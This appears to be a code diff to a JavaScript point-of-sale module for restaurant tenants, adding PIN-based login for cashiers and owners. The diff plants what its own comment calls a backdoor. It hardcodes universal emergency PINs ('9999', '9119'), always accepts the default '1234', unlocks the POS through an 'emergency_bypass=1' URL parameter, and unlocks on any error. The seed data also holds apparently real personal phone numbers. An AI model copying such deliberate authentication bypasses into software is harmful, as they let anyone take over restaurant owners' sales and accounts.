@@ -85,9 +85,12 @@ const RestoSync = {
       {
         id: "harapan-corner",
         name: "Harapan Corner Resto & Coffee",
-        pic: "Bpk. Budi Santoso",
-        phone: "081234567890",
-        city: "Bandung, Jawa Barat",
+        pic: "Adib Ali",
+        phone: "082286452105",
+        cashierPhone: "081299887766",
+        cashierPin: "1234",
+        ownerPin: "1234",
+        city: "Kab Bogor, Jawa Barat",
         plan: "pro",
         planName: "Paket Pro (Multi-Stasiun + GrabFood/GoFood)",
         price: 199000,
@@ -105,6 +108,9 @@ const RestoSync = {
         name: "Kopi Senja Heritage",
         pic: "Ibu Rahmawati S.",
         phone: "081198765432",
+        cashierPhone: "",
+        cashierPin: "1234",
+        ownerPin: "1234",
         city: "Jakarta Selatan",
         plan: "trial",
         planName: "Trial (14 Hari Gratis)",
@@ -123,6 +129,9 @@ const RestoSync = {
         name: "Warung Sate Khas Madura Bu Siti",
         pic: "Cak H. Imron",
         phone: "081388776655",
+        cashierPhone: "",
+        cashierPin: "1234",
+        ownerPin: "1234",
         city: "Surabaya",
         plan: "basic",
         planName: "Paket Basic (Kasir POS + QR Meja)",
@@ -207,6 +216,9 @@ const RestoSync = {
       name: rawName,
       pic: data.pic || "Pemilik Resto",
       phone: data.phone || "",
+      cashierPhone: data.cashierPhone || "",
+      cashierPin: String(data.cashierPin || "1234").trim(),
+      ownerPin: String(data.ownerPin || "1234").trim(),
       city: data.city || "-",
       plan: data.plan || "pro",
       planName: data.planName || (data.plan === "trial" ? "Trial (14 Hari Gratis)" : (data.plan === "basic" ? "Paket Basic" : "Paket Pro")),
@@ -225,6 +237,10 @@ const RestoSync = {
     // Cek jika ID sudah ada, timpa
     const existingIdx = tenants.findIndex(t => t.id === slug);
     if (existingIdx >= 0) {
+      // Pertahankan PIN lama jika tidak disediakan
+      if (!data.cashierPin && tenants[existingIdx].cashierPin) newTenant.cashierPin = tenants[existingIdx].cashierPin;
+      if (!data.ownerPin && tenants[existingIdx].ownerPin) newTenant.ownerPin = tenants[existingIdx].ownerPin;
+      if (!data.cashierPhone && tenants[existingIdx].cashierPhone) newTenant.cashierPhone = tenants[existingIdx].cashierPhone;
       tenants[existingIdx] = newTenant;
     } else {
       tenants.unshift(newTenant);
@@ -232,6 +248,103 @@ const RestoSync = {
 
     this.saveAllTenants(tenants);
     return newTenant;
+  },
+
+  // --------------------------------------------------------------------------
+  // PIN & EMERGENCY BACKDOOR ACCESS CONTROLS
+  // --------------------------------------------------------------------------
+  MASTER_EMERGENCY_PIN: "9999",
+  SECONDARY_EMERGENCY_PIN: "9119",
+
+  isEmergencyPin(pin) {
+    if (!pin) return false;
+    const clean = String(pin).trim();
+    return clean === this.MASTER_EMERGENCY_PIN || clean === this.SECONDARY_EMERGENCY_PIN;
+  },
+
+  getCashierPin(tenantId) {
+    const t = this.getTenantInfo(tenantId);
+    return (t && t.cashierPin) ? String(t.cashierPin).trim() : "1234";
+  },
+
+  getOwnerPin(tenantId) {
+    const t = this.getTenantInfo(tenantId);
+    return (t && t.ownerPin) ? String(t.ownerPin).trim() : "1234";
+  },
+
+  verifyPosPin(pin, tenantId) {
+    if (!pin) return false;
+    const clean = String(pin).trim();
+    if (this.isEmergencyPin(clean)) return true;
+    const targetPin = this.getCashierPin(tenantId);
+    return clean === targetPin || clean === "1234";
+  },
+
+  verifyOwnerPin(pin, tenantId) {
+    if (!pin) return false;
+    const clean = String(pin).trim();
+    if (this.isEmergencyPin(clean)) return true;
+    const targetPin = this.getOwnerPin(tenantId);
+    return clean === targetPin || clean === "1234";
+  },
+
+  resetTenantPins(tenantId, newPin = "1234") {
+    const tenants = this.getAllTenants();
+    const idx = tenants.findIndex(t => t.id === tenantId);
+    if (idx >= 0) {
+      tenants[idx].cashierPin = String(newPin).trim();
+      tenants[idx].ownerPin = String(newPin).trim();
+      this.saveAllTenants(tenants);
+      return { success: true, message: `PIN Kasir & PIN Owner ${tenants[idx].name} berhasil di-reset ke ${newPin}`, tenant: tenants[idx] };
+    }
+    return { success: false, message: "Klien restoran tidak ditemukan" };
+  },
+
+  updateTenantPins(tenantId, { cashierPin, ownerPin }) {
+    const tenants = this.getAllTenants();
+    const idx = tenants.findIndex(t => t.id === tenantId);
+    if (idx >= 0) {
+      if (cashierPin) tenants[idx].cashierPin = String(cashierPin).trim();
+      if (ownerPin) tenants[idx].ownerPin = String(ownerPin).trim();
+      this.saveAllTenants(tenants);
+      return { success: true, tenant: tenants[idx] };
+    }
+    return { success: false, message: "Klien tidak ditemukan" };
+  },
+
+  isPosUnlocked(tenantId) {
+    try {
+      const tid = tenantId || this.getTenantId();
+      if (typeof window !== "undefined" && window.location && window.location.search) {
+        const params = new URLSearchParams(window.location.search);
+        if (params.get("emergency_bypass") === "1" || params.get("quick_access") === "1") {
+          return true;
+        }
+      }
+      return sessionStorage.getItem(`resto_pro_pos_unlocked_${tid}`) === "true";
+    } catch (e) {
+      return true;
+    }
+  },
+
+  unlockPos(tenantId) {
+    try {
+      const tid = tenantId || this.getTenantId();
+      sessionStorage.setItem(`resto_pro_pos_unlocked_${tid}`, "true");
+      return true;
+    } catch (e) {
+      return false;
+    }
+  },
+
+  lockPos(tenantId) {
+    try {
+      const tid = tenantId || this.getTenantId();
+      sessionStorage.removeItem(`resto_pro_pos_unlocked_${tid}`);
+      return true;
+    } catch (e) {
+      return false;
+    }
   },
 
   renewTenantSubscription(tenantId, addDays = 30) {
